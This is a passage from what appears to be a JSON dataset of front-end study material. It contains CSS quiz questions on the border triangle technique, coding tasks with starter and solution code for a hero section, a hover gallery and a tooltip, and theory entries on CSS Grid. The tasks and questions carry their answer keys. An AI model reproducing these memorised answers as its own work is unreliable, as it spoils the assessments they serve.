        {
          "id": "question_triangle_mcq_1",
          "topic": "CSS Triangle Technique",
          "level": "medium",
          "type": "mcq",
          "question": "To create a CSS triangle pointing to the right, which borders should be transparent and which one should have a color, assuming the element has `width: 0; height: 0;`?",
          "answer": "`border-top` and `border-bottom` should be transparent; `border-left` should have a color.",
          "options": [
            "`border-left` and `border-right` transparent; `border-top` colored.",
            "`border-top` and `border-bottom` transparent; `border-left` colored.",
            "`border-left` and `border-bottom` transparent; `border-right` colored.",
            "`border-right` and `border-top` transparent; `border-bottom` colored."
          ],
          "analysisPoints": [
            "Tests understanding of the CSS triangle principle.",
            "Evaluates the ability to apply the technique for a specific directional shape."
          ],
          "keyConcepts": [
            "CSS Triangle Technique",
            "Borders",
            "Transparent Borders",
            "Directional Triangles"
          ],
          "evaluationCriteria": [
            "Correct identification of border roles for specific triangle direction."
          ],
          "example": "To make a triangle point right, the 'base' of the triangle must be on the left side. This is achieved by giving `border-left` a color and width. The `border-top` and `border-bottom` then need to be transparent. These transparent borders extend from the top-left and bottom-left corners respectively, meeting at a point on the right, thus forming the slanted sides of the right-pointing triangle.",
          "tags": [
            "CSS",
            "Triangle",
            "Styling",
            "Shapes"
          ],
          "prerequisites": [
            "CSS Borders",
            "CSS Box Model"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_triangle_open_1",
          "topic": "CSS Triangle Technique",
          "level": "hard",
          "type": "open",
          "question": "Explain the fundamental principle behind creating CSS triangles using borders. Why is it necessary to set `width: 0` and `height: 0` for the element, and how do transparent borders contribute to forming the triangle shape?",
          "answer": "The fundamental principle behind creating CSS triangles using borders lies in how an element's borders interact when the element's content box has zero dimensions. When an element has `width: 0` and `height: 0`, its content area collapses. The borders, however, still maintain their specified widths and meet at the center of the element.\n\nImagine an element with `width: 0` and `height: 0` and all four borders (top, right, bottom, left) having a solid color and a certain width. At the element's center, where the four borders converge, they effectively divide the space into four triangular sections. Each border segment visually forms the base of one of these triangles, and the transparent borders form the slanting sides that meet at the central point.\n\n**Why `width: 0` and `height: 0` are necessary:**\nThese properties are crucial because they collapse the content box of the element. If the element had `width` or `height` greater than zero, the borders would run along the edges of the content box, forming rectangular bands rather than meeting at a sharp point. By collapsing the content box, the internal corners of the borders meet precisely at the element's central point, allowing the triangular shapes to form a crisp point.\n\n**How transparent borders contribute:**\nWhen all four borders are colored, they form a diamond shape composed of four triangles. To isolate a single triangle pointing in a specific direction, you make the borders *perpendicular* to the desired direction `transparent`. The `border-color` property can be set to `transparent` for these borders. The border that you want to form the 'base' of your triangle is given a solid color and a width.\n\nFor example, to create a down-pointing triangle:\n*   `width: 0; height: 0;` (collapses the content area)\n*   `border-left: 20px solid transparent;`\n*   `border-right: 20px solid transparent;`\n*   `border-top: 20px solid #333;` (the visible base of the triangle)\n\nIn this scenario, `border-top` provides the horizontal base. The `border-left` and `border-right`, though transparent, still occupy space. Their transparent sections extend from the corners of the (zero-dimension) content box down to the central meeting point, forming the two slanted sides of the visible triangle. The transparent color simply makes these sides invisible, leaving only the colored `border-top` and the implied triangular shape formed by the meeting transparent borders.",
          "analysisPoints": [
            "Provides a comprehensive explanation of the underlying mechanism.",
            "Clearly articulates the role of `width: 0` and `height: 0`.",
            "Explains how transparent borders facilitate the shape.",
            "Uses a concrete example to illustrate the concept."
          ],
          "keyConcepts": [
            "CSS Triangle Technique",
            "Box Model",
            "Borders",
            "Transparent Colors",
            "Geometric Shapes in CSS"
          ],
          "evaluationCriteria": [
            "Depth of theoretical understanding.",
            "Ability to explain complex CSS behavior clearly.",
            "Logical flow and accuracy of explanation."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Advanced CSS",
            "Shapes",
            "Borders",
            "Theory"
          ],
          "prerequisites": [
            "CSS Box Model",
            "Border Property"
          ],
          "complexity": 8,
          "interviewFrequency": 6,
          "learningPath": "advanced"
        },
        {
          "id": "question_triangle_flashcard_1",
          "topic": "CSS Triangle Technique",
          "level": "easy",
          "type": "flashcard",
          "question": "What are the essential `width` and `height` values for an element when using the CSS border technique to create a triangle?",
          "answer": "`width: 0; height: 0;`",
          "analysisPoints": [
            "Tests recall of fundamental CSS triangle requirements."
          ],
          "keyConcepts": [
            "CSS Triangle Technique",
            "Dimensions",
            "Box Model"
          ],
          "evaluationCriteria": [
            "Direct recall of key property values."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Triangle",
            "Flashcard"
          ],
          "prerequisites": [
            "CSS Box Model"
          ],
          "complexity": 2,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        }
      ],
      "tasks": [
        {
          "id": "task_responsive_centered_hero",
          "title": "Build a Responsive Centered Hero Section",
          "description": "\nImplement a hero section that features a main heading and a call-to-action button, both centered vertically and horizontally within the section. The hero section should span the full viewport height and adapt responsively to different screen sizes. Use either Flexbox or CSS Grid for centering, demonstrating best practices.\n\n**Requirements:**\n1.  The hero section should take up 100% of the viewport height (`vh`).\n2.  The content (heading + button) inside the hero section must be perfectly centered both horizontally and vertically.\n3.  Ensure the layout remains centered and functional across various screen widths (responsive).\n4.  Add some basic styling (background color, text color) for visual appeal.\n5.  The content should stack vertically (heading above button) and be centered relative to each other.\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Centered Hero Section</title>\n    <style>\n        body, html {\n            margin: 0;\n            padding: 0;\n            box-sizing: border-box;\n        }\n\n        .hero-section {\n            /* Your CSS for centering and full height */\n            background-color: #282c34;\n            color: white;\n            text-align: center; /* For content inside flex/grid item */\n        }\n\n        .hero-content h1 {\n            font-size: 3em;\n            margin-bottom: 20px;\n        }\n\n        .hero-content button {\n            padding: 15px 30px;\n            font-size: 1.2em;\n            background-color: #61dafb;\n            color: #282c34;\n            border: none;\n            border-radius: 8px;\n            cursor: pointer;\n        }\n    </style>\n</head>\n<body>\n    <section class=\"hero-section\">\n        <div class=\"hero-content\">\n            <h1>Welcome to Our Awesome Site</h1>\n            <button>Learn More</button>\n        </div>\n    </section>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Centered Hero Section</title>\n    <style>\n        body, html {\n            margin: 0;\n            padding: 0;\n            box-sizing: border-box;\n        }\n\n        .hero-section {\n            display: flex; /* Using Flexbox for centering */\n            justify-content: center;\n            align-items: center;\n            height: 100vh; /* 100% of viewport height */\n            background-color: #282c34;\n            color: white;\n        }\n\n        .hero-content {\n            text-align: center; /* Ensures h1 and button are horizontally centered relative to each other within this div */\n            display: flex; /* Make hero-content a flex container itself */\n            flex-direction: column; /* Stack h1 and button vertically */\n            align-items: center; /* Center items within hero-content */\n            padding: 20px;\n            max-width: 90%; /* Prevent content from stretching too wide on large screens */\n            box-sizing: border-box;\n        }\n\n        .hero-content h1 {\n            font-size: 3em;\n            margin-bottom: 20px;\n            /* For smaller screens, use a fluid font size */\n            font-size: clamp(2em, 5vw, 3em);\n        }\n\n        .hero-content button {\n            padding: 15px 30px;\n            font-size: 1.2em;\n            background-color: #61dafb;\n            color: #282c34;\n            border: none;\n            border-radius: 8px;\n            cursor: pointer;\n            transition: background-color 0.3s ease, transform 0.2s ease;\n        }\n\n        .hero-content button:hover {\n            background-color: #a0eaff;\n            transform: translateY(-2px);\n        }\n\n        /* Optional: Media queries for finer control */\n        @media (max-width: 768px) {\n            .hero-content h1 {\n                font-size: 2.5em;\n            }\n            .hero-content button {\n                font-size: 1em;\n                padding: 12px 25px;\n            }\n        }\n    </style>\n</head>\n<body>\n    <section class=\"hero-section\">\n        <div class=\"hero-content\">\n            <h1>Welcome to Our Awesome Site</h1>\n            <button>Learn More</button>\n        </div>\n    </section>\n</body>\n</html>\n",
          "testCases": [
            "Verify `hero-section` occupies 100% viewport height by checking its dimensions in developer tools.",
            "Check if `hero-content` is perfectly centered horizontally and vertically within the `hero-section` using browser developer tools (e.g., by checking its computed position).",
            "Resize the browser window to small mobile sizes (e.g., 320px width), medium tablet sizes (e.g., 768px width), and large desktop sizes to ensure responsiveness and continued centering.",
            "Inspect the CSS to confirm usage of Flexbox or Grid properties for centering (e.g., `display: flex`, `justify-content`, `align-items`).",
            "Confirm the heading and button are stacked vertically within `hero-content` and centered relative to each other (e.g., `flex-direction: column`, `align-items: center` on `hero-content`)."
          ],
          "hints": [
            "Remember that `height: 100vh;` is crucial for vertical centering within the viewport when using Flexbox or Grid.",
            "Consider making `.hero-section` a flex container. What `justify-content` and `align-items` values would center its direct child (`.hero-content`)?",
            "If you choose CSS Grid, the `place-items` shorthand is a very efficient way to center its direct children.",
            "For content within `.hero-content` (heading and button) to stack vertically and be centered relative to each other, you might need to make `.hero-content` itself a flex container with `flex-direction: column`."
          ],
          "tags": [
            "CSS",
            "Flexbox",
            "Grid",
            "Centering",
            "Responsive Design",
            "Layout",
            "UI/UX"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "CSS Flexbox",
            "CSS Grid",
            "Viewport Units",
            "Media Queries"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "CSS Layout",
            "Viewport Units",
            "Responsive Web Design"
          ]
        },
        {
          "id": "task_interactive_image_gallery",
          "title": "Interactive Image Gallery with Transforms & Transitions",
          "description": "\nCreate a small image gallery (e.g., 3-4 images) where each image or its container scales up slightly and rotates a few degrees on hover. The transformation should occur smoothly with a transition effect.\n\n**Requirements:**\n1.  Set up an HTML structure for an image gallery, e.g., a container (`.gallery-container`) with multiple image wrappers (`.gallery-item`) containing `<img>` tags.\n2.  Apply CSS to each `.gallery-item` such that:\n    *   On hover, the item scales up (e.g., to 1.1 or 1.2 times its size).\n    *   On hover, the item rotates slightly (e.g., 5-10 degrees).\n    *   Both scaling and rotation should happen simultaneously and smoothly over a duration of your choice (e.g., 0.3s - 0.5s) using CSS Transitions.\n3.  Ensure the items return to their original state smoothly when the hover effect ends.\n4.  Maintain a clean and readable code structure.\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Interactive Gallery</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            min-height: 100vh;\n            background-color: #f0f0f0;\n            margin: 0;\n        }\n        .gallery-container {\n            display: flex;\n            gap: 20px;\n            flex-wrap: wrap;\n            justify-content: center;\n            padding: 20px;\n        }\n        .gallery-item {\n            width: 200px;\n            height: 150px;\n            overflow: hidden;\n            border: 5px solid #fff;\n            box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n            border-radius: 8px;\n            /* Add your transform and transition here */\n        }\n        .gallery-item img {\n            width: 100%;\n            height: 100%;\n            object-fit: cover;\n            display: block;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"gallery-container\">\n        <div class=\"gallery-item\">\n            <img src=\"https://via.placeholder.com/200x150/FF5733/FFFFFF?text=Image+1\" alt=\"Image 1\">\n        </div>\n        <div class=\"gallery-item\">\n            <img src=\"https://via.placeholder.com/200x150/33FF57/FFFFFF?text=Image+2\" alt=\"Image 2\">\n        </div>\n        <div class=\"gallery-item\">\n            <img src=\"https://via.placeholder.com/200x150/3357FF/FFFFFF?text=Image+3\" alt=\"Image 3\">\n        </div>\n    </div>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Interactive Gallery</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            min-height: 100vh;\n            background-color: #f0f0f0;\n            margin: 0;\n        }\n        .gallery-container {\n            display: flex;\n            gap: 20px;\n            flex-wrap: wrap;\n            justify-content: center;\n            padding: 20px;\n        }\n        .gallery-item {\n            width: 200px;\n            height: 150px;\n            overflow: hidden;\n            border: 5px solid #fff;\n            box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n            border-radius: 8px;\n            /* Important: Apply transition to the element that changes transform */\n            transition: transform 0.3s ease-in-out, box-shadow 0.3s ease;\n        }\n        .gallery-item:hover {\n            transform: scale(1.1) rotate(5deg); /* Combined transforms */\n            box-shadow: 0 8px 16px rgba(0,0,0,0.2);\n        }\n        .gallery-item img {\n            width: 100%;\n            height: 100%;\n            object-fit: cover;\n            display: block;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"gallery-container\">\n        <div class=\"gallery-item\">\n            <img src=\"https://via.placeholder.com/200x150/FF5733/FFFFFF?text=Image+1\" alt=\"Image 1\">\n        </div>\n        <div class=\"gallery-item\">\n            <img src=\"https://via.placeholder.com/200x150/33FF57/FFFFFF?text=Image+2\" alt=\"Image 2\">\n        </div>\n        <div class=\"gallery-item\">\n            <img src=\"https://via.placeholder.com/200x150/3357FF/FFFFFF?text=Image+3\" alt=\"Image 3\">\n        </div>\n    </div>\n</body>\n</html>\n",
          "testCases": [
            "Hover over each image item: Does it smoothly scale up and rotate?",
            "Check if the animation is smooth (not instantaneous) both when hovering on and off.",
            "Verify images return to their original state smoothly when the hover effect ends.",
            "Inspect CSS to confirm correct use of `transform` for `scale()` and `rotate()` functions combined.",
            "Inspect CSS to confirm `transition` property is applied correctly (e.g., `transition: transform 0.3s ease-in-out;` or `transition: all 0.3s ease-in-out;`)."
          ],
          "hints": [
            "The `transform` property allows combining multiple transform functions by listing them separated by spaces (e.g., `transform: rotate(Xdeg) scale(Y);`).",
            "Apply the `transition` property to the initial state of the element (`.gallery-item`) to ensure a smooth transition both on hover and when returning from hover.",
            "The `:hover` pseudo-class is essential for triggering the effect.",
            "Consider the `transform-origin` property if you want to change the point around which rotation and scaling occur (though default `center` is usually fine for this task).",
            "Ensure the `transition-property` includes `transform`."
          ],
          "tags": [
            "CSS",
            "Transforms",
            "Transitions",
            "Animation",
            "UI/UX",
            "Interactive",
            "Hover Effects"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "CSS Transforms",
            "CSS Transitions",
            "Pseudo-classes"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "User Interface Design",
            "Micro-interactions"
          ]
        },
        {
          "id": "task_custom_tooltip_with_triangle",
          "title": "Create a Custom Tooltip with Directional Pointer",
          "description": "\nImplement a custom tooltip component that appears on hover over a target element. The tooltip should include a small triangular 'pointer' that visually connects it to the hovered element, indicating its origin. The tooltip should also have a subtle fade-in transition when it appears.\n\n**Requirements:**\n1.  Create a `div` element that acts as the tooltip target (e.g., a button or an icon).\n2.  Create a tooltip `div` that is initially hidden.\n3.  On hover over the target, the tooltip should become visible.\n4.  The tooltip should contain a background, text, and padding.\n5.  Implement a CSS triangle (using the border technique) positioned at the bottom center of the tooltip, pointing downwards to the target element.\n6.  The tooltip should smoothly fade in (`opacity`) when it appears (on hover) and fade out when the hover ends.\n7.  Ensure the tooltip appears directly above the target element, with its triangle pointing to the center of the target.\n",
          "difficulty": "hard",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Custom Tooltip</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            min-height: 100vh;\n            background-color: #f8f8f8;\n            margin: 0;\n        }\n\n        .tooltip-container {\n            position: relative; /* Establish positioning context for tooltip */\n            display: inline-block; /* Allow the container to wrap its content */\n        }\n\n        .tooltip-target {\n            padding: 10px 20px;\n            background-color: #007bff;\n            color: white;\n            border-radius: 5px;\n            cursor: pointer;\n            font-size: 1em;\n            font-weight: bold;\n            border: none;\n        }\n\n        .tooltip-content {\n            position: absolute;\n            bottom: calc(100% + 10px); /* Position above the target + some space */\n            left: 50%;\n            transform: translateX(-50%); /* Center horizontally */\n            background-color: #333;\n            color: white;\n            padding: 10px 15px;\n            border-radius: 5px;\n            white-space: nowrap;\n            z-index: 100;\n            opacity: 0;\n            visibility: hidden;\n            /* Add your transition here */\n            /* Add your triangle here */\n        }\n\n        .tooltip-container:hover .tooltip-content {\n            opacity: 1;\n            visibility: visible;\n            /* Adjust position if necessary based on triangle */\n        }\n    </style>\n</head>\n<body>\n    <div class=\"tooltip-container\">\n        <button class=\"tooltip-target\">Hover Me</button>\n        <div class=\"tooltip-content\">\n            This is a custom tooltip!\n            <!-- Add triangle element here -->\n        </div>\n    </div>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Custom Tooltip</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            min-height: 100vh;\n            background-color: #f8f8f8;\n            margin: 0;\n        }\n\n        .tooltip-container {\n            position: relative; /* Establish positioning context for tooltip */\n            display: inline-block; /* Allow the container to wrap its content */\n        }\n\n        .tooltip-target {\n            padding: 10px 20px;\n            background-color: #007bff;\n            color: white;\n            border-radius: 5px;\n            cursor: pointer;\n            font-size: 1em;\n            font-weight: bold;\n            border: none;\n        }\n\n        .tooltip-content {\n            position: absolute;\n            /* bottom: 100% positions its bottom edge at the top edge of the parent. */\n            /* Add padding-bottom equal to the triangle's height to prevent overlap. */\n            bottom: calc(100% + 8px); /* Position above the target + triangle height */\n            left: 50%;\n            transform: translateX(-50%); /* Center horizontally */\n            background-color: #333;\n            color: white;\n            padding: 10px 15px;\n            border-radius: 5px;\n            white-space: nowrap;\n            z-index: 100;\n            opacity: 0;\n            visibility: hidden; /* Hide initially, allows transitions */\n            transition: opacity 0.3s ease, visibility 0.3s ease;\n        }\n\n        .tooltip-container:hover .tooltip-content {\n            opacity: 1;\n            visibility: visible;\n        }\n\n        /* CSS Triangle for the tooltip pointer */\n        .tooltip-content::after {\n            content: '';\n            position: absolute;\n            top: 100%; /* Position at the bottom of the tooltip content */\n            left: 50%;\n            transform: translateX(-50%); /* Center the triangle */\n            width: 0;\n            height: 0;\n            border-left: 8px solid transparent;\n            border-right: 8px solid transparent;\n            border-top: 8px solid #333; /* Color should match tooltip background */\n        }\n    </style>\n</head>\n<body>\n    <div class=\"tooltip-container\">\n        <button class=\"tooltip-target\">Hover Me</button>\n        <div class=\"tooltip-content\">\n            This is a custom tooltip!\n        </div>\n    </div>\n</body>\n</html>\n",
          "testCases": [
            "Hover over the button: Does the tooltip appear?",
            "Check if the tooltip has a smooth fade-in and fade-out transition (0.3s ease).",
            "Verify the tooltip appears centered horizontally above the button.",
            "Confirm the triangular pointer is present, points downwards, and is perfectly centered at the bottom of the tooltip, aligning with the target element's center.",
            "Check if the triangle's color matches the tooltip's background color.",
            "Test responsiveness: Ensure tooltip remains correctly positioned on smaller screens (if text wraps, `white-space: nowrap` might need adjustment or removal for long content)."
          ],
          "hints": [
            "Use `position: relative` on the `.tooltip-container` (the common parent of target and tooltip) and `position: absolute` on `.tooltip-content` for positioning.",
            "The CSS triangle can be created using a pseudo-element (e.g., `::after`) on the `.tooltip-content` to position it relative to the tooltip itself.",
            "Remember to set `width: 0`, `height: 0`, and specific `border` properties for the pseudo-element to form the triangle.",
            "Positioning the triangle requires `top: 100%` (to place it at the bottom of the `tooltip-content`) and `left: 50%` with `transform: translateX(-50%)` on the pseudo-element to center it.",
            "For the fade effect, transition `opacity`. Also, transitioning `visibility` (`visibility: hidden` to `visibility: visible`) alongside `opacity` is good practice as `visibility: hidden` prevents the element from receiving pointer events when hidden.",
            "Ensure the triangle's `border-top` color matches the tooltip's `background-color` to create a seamless pointer."
          ],
          "tags": [
            "CSS",
            "Positioning",
            "Transitions",
            "Pseudo-elements",
            "UI Components",
            "Tooltip",
            "Advanced CSS",
            "Triangle Technique"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "CSS Positioning",
            "CSS Transitions",
            "CSS Triangle Technique",
            "Pseudo-elements"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Component Design",
            "Accessibility (basic)",
            "UX Micro-interactions"
          ]
        }
      ]
    }
  },
  {
    "id": "e6c0a01e-3ea4-4ccd-992d-a1624e048389",
    "startLine": 11900,
    "endLine": 11999,
    "processedDate": "2025-06-17T12:40:47.884Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_css_grid_fundamentals",
          "title": "CSS Grid Fundamentals: Defining Rows, Columns, and Gaps",
          "content": "CSS Grid is a powerful two-dimensional layout system that allows precise control over both rows and columns simultaneously. Unlike Flexbox, which is primarily one-dimensional, Grid excels at overall page layouts and complex, asymmetrical designs.\n\n## Key Concepts\n*   **Grid Container**: An element with `display: grid` or `display: inline-grid`. This element becomes the parent for grid items and establishes a new grid formatting context.\n*   **Grid Items**: The direct children of a grid container. These elements are laid out according to the grid rules.\n*   **Grid Lines**: Horizontal and vertical lines that divide the grid into cells. Numbered starting from 1.\n*   **Grid Tracks**: The space between two adjacent grid lines, forming columns or rows.\n*   **Grid Cells**: The intersection of a grid row and a grid column, the smallest unit of a grid.\n*   **`display: grid`**: Turns an element into a grid container.\n*   **`grid-template-columns`**: Defines the columns of the grid. You can specify fixed sizes (e.g., `100px`), flexible sizes (e.g., `1fr` for a fraction of available space), or repeat patterns (`repeat(3, 1fr)`).\n*   **`grid-template-rows`**: Defines the rows of the grid, similar to `grid-template-columns`.\n*   **`gap`**: (formerly `grid-gap`) A shorthand property for `row-gap` and `column-gap`. It defines the spacing between grid cells, not around the container.\n\n## Units in Grid\n*   **`fr` (fractional unit)**: Represents a fraction of the available space in the grid container. `1fr` means one part of the free space. If you have `1fr 2fr`, the second column will be twice as wide as the first.\n*   **Fixed units**: `px`, `em`, `rem`, `vw`, `vh`, etc.\n*   **`auto`**: Allows the browser to determine the size of the track based on its content.",
          "examples": [
            {
              "id": "example_css_grid_basic_1",
              "title": "Basic Grid Definition",
              "code": "```css\n.basic-grid {\n  display: grid;\n  grid-template-columns: 100px 1fr 200px; /* Column 1: 100px, Column 2: fills remaining space, Column 3: 200px */\n  grid-template-rows: 50px auto;\n  gap: 15px;\n  background-color: #eee;\n  padding: 10px;\n}\n\n.grid-item {\n  background-color: lightblue;\n  border: 1px solid #333;\n  padding: 10px;\n}\n\n/* HTML Structure */\n/*\n<div class=\"basic-grid\">\n  <div class=\"grid-item\">Item 1</div>\n  <div class=\"grid-item\">Item 2</div>\n  <div class=\"grid-item\">Item 3</div>\n  <div class=\"grid-item\">Item 4</div>\n  <div class=\"grid-item\">Item 5</div>\n  <div class=\"grid-item\">Item 6</div>\n</div>\n*/\n```",
              "explanation": "This example sets up a grid with three columns (fixed, fractional, fixed) and two rows (fixed, auto). A `gap` of 15px is applied between grid cells. The fractional unit `1fr` ensures that the middle column expands to fill the available space.",
              "language": "css"
            },
            {
              "id": "example_css_grid_repeat_1",
              "title": "Using `repeat()` for Columns and Rows",
              "code": "```css\n.grid-repeat {\n  display: grid;\n  grid-template-columns: repeat(4, 1fr); /* Creates 4 equal columns */\n  grid-template-rows: repeat(2, 80px);   /* Creates 2 rows, each 80px high */\n  gap: 10px 20px; /* Row gap: 10px, Column gap: 20px */\n  background-color: #f0f0f0;\n  padding: 10px;\n}\n\n.grid-item {\n  background-color: lightcoral;\n  border: 1px solid #333;\n  padding: 10px;\n}\n\n/* HTML Structure */\n/*\n<div class=\"grid-repeat\">\n  <div class=\"grid-item\">A</div>\n  <div class=\"grid-item\">B</div>\n  <div class=\"grid-item\">C</div>\n  <div class=\"grid-item\">D</div>\n  <div class=\"grid-item\">E</div>\n  <div class=\"grid-item\">F</div>\n  <div class=\"grid-item\">G</div>\n  <div class=\"grid-item\">H</div>\n</div>\n*/\n```",
              "explanation": "The `repeat()` function is a concise way to define multiple columns or rows with the same size. Here, `repeat(4, 1fr)` creates four equally sized columns, and `repeat(2, 80px)` creates two rows of 80px height. `gap` can also take two values for distinct row and column gaps.",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_css_grid_fundamental_1",
            "question_css_grid_fundamental_2",
            "question_css_grid_fundamental_3",
            "question_css_grid_fundamental_4",
            "question_css_grid_fundamental_5",
            "question_css_grid_fundamental_6"
          ],
          "relatedTasks": [
            "task_grid_basic_layout"
          ],
          "tags": [
            "CSS Grid",
            "Layout",
            "Frontend",
            "Responsive Design",
            "Grid-template-columns",
            "Grid-template-rows",
            "Gap"
          ],
          "technology": "CSS",
          "prerequisites": [
            "HTML Structure",
            "Basic CSS Properties"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Advanced CSS Grid",
            "Responsive Web Design"
          ]
        },
        {
          "id": "theory_css_grid_advanced_layouts",
          "title": "Advanced CSS Grid Layouts: Named Areas and Auto-Placement",
          "content": "Beyond basic row and column definitions, CSS Grid offers powerful features for creating more intuitive and responsive layouts, such as named grid areas and automatic item placement.\n\n## Key Concepts\n*   **`grid-template-areas`**: A property used on the grid container to define the layout of the grid by referencing named grid areas. This provides a very visual way to design the grid structure in your CSS. Each string represents a row, and the words within the string represent cells that the named area will span.\n*   **`grid-area`**: A property used on a grid item to assign it to a named grid area defined by `grid-template-areas`. If an item is not explicitly assigned to a named area, it will be auto-placed.\n*   **`auto-placement`**: When grid items are not explicitly placed (e.g., using `grid-row`/`grid-column` or `grid-area`), they are automatically placed into available grid cells.\n*   **`grid-auto-flow`**: Controls how auto-placed items flow into the grid (e.g., `row` or `column`). Defaults to `row`.\n*   **`grid-template-columns` / `grid-template-rows` with `auto-fill` and `auto-fit`**: These keywords are used within the `repeat()` function to create dynamic and responsive grids:\n    *   **`auto-fill`**: Creates as many columns/rows as possible without overflowing the container, even if the container is larger than the sum of the maximum sizes of all tracks. Empty tracks will remain.\n    *   **`auto-fit`**: Similar to `auto-fill`, but it collapses any empty tracks, making the contained items expand to fill the available space when there are fewer items than the maximum possible tracks.\n*   **`minmax(min, max)`**: A function used within `grid-template-columns` or `grid-template-rows` to define a size range for a track. The track will be at least `min` and at most `max`. This is crucial for responsive designs, ensuring items are never smaller than a certain size but can grow to fill space.",
          "examples": [
            {
              "id": "example_grid_named_areas_1",
              "title": "Layout with Named Grid Areas",
              "code": "```css\n.layout-areas {\n  display: grid;\n  grid-template-columns: 1fr 3fr 1fr;\n  grid-template-rows: auto 1fr auto;\n  grid-template-areas:\n    \"header header header\"\n    \"sidebar content aside\"\n    \"footer footer footer\";\n  min-height: 100vh;\n  gap: 10px;\n  background-color: #f8f8f8;\n}\n\n.header { grid-area: header; background-color: #aaddff; padding: 20px; text-align: center; }\n.sidebar { grid-area: sidebar; background-color: #cceeff; padding: 20px; }\n.content { grid-area: content; background-color: #ddeeff; padding: 20px; }\n.aside { grid-area: aside; background-color: #eef8ff; padding: 20px; }\n.footer { grid-area: footer; background-color: #bbddff; padding: 20px; text-align: center; }\n\n/* HTML Structure */\n/*\n<div class=\"layout-areas\">\n  <header class=\"header\">Header</header>\n  <nav class=\"sidebar\">Sidebar</nav>\n  <main class=\"content\">Main Content</main>\n  <aside class=\"aside\">Aside</aside>\n  <footer class=\"footer\">Footer</footer>\n</div>\n*/\n```",
              "explanation": "This example demonstrates creating a common website layout using `grid-template-areas`. Each string in `grid-template-areas` defines a row. Identical names span cells for that area. `grid-area` on child elements assigns them to these named regions, resulting in a clear and readable layout definition.",
              "language": "css"
            },
            {
              "id": "example_grid_auto_placement_1",
              "title": "Responsive Grid with `auto-fill` and `minmax`",
              "code": "```css\n.responsive-grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));\n  /* Creates as many columns as possible, each at least 200px wide, \n     and growing to fill available space evenly */\n  gap: 20px;\n  padding: 20px;\n  background-color: #e0e0e0;\n}\n\n.grid-item {\n  background-color: #ffd700;\n  border: 1px solid #ccaa00;\n  padding: 20px;\n  text-align: center;\n}\n\n/* HTML Structure */\n/*\n<div class=\"responsive-grid\">\n  <div class=\"grid-item\">Card 1</div>\n  <div class=\"grid-item\">Card 2</div>\n  <div class=\"grid-item\">Card 3</div>\n  <div class=\"grid-item\">Card 4</div>\n  <div class=\"grid-item\">Card 5</div>\n  <div class=\"grid-item\">Card 6</div>\n</div>\n*/\n```",
              "explanation": "This demonstrates a highly flexible and responsive grid. `repeat(auto-fill, minmax(200px, 1fr))` ensures that the grid always tries to fit as many columns as possible, each at least 200px wide. If there's more space, columns expand equally due to `1fr`. If there's less space, columns shrink down to `200px` before wrapping. `auto-fill` will create empty tracks if items don't fill all potential slots.",
              "language": "css"
            },
            {
              "id": "example_grid_auto_fit_1",
              "title": "Responsive Grid with `auto-fit` and `minmax`",
